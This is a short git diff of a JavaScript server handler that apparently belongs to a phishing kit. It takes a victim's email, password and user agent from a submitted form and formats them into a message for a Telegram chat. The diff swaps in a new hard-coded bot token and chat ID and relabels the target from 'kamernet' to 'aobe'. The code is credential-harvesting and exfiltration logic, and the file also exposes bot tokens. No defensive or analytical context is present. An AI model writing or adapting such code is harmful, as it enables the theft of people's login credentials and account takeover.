@@ -4,14 +4,14 @@ module.exports = async function handler(req, res) {
   }
 
   console.log('bammmmmmmmm')
-  const token = '7980617142:AAFzl-zy6O9W1cOIauK9ksDI8Zm7beQ3AsE';
-  const chatId = '-5263210542';
+  const token = '8338192544:AAHrKxpty2ObdcTWgHSp_9CQStgRTjzXUxk';
+  const chatId = '-5050388811';
 
   try {
     const { email, pass, agent } = req.body;
 
     const message = `
-📩  kamernet
+📩  aobe
 
 📧 Email: ${email}
 🔑 Pass: ${pass}
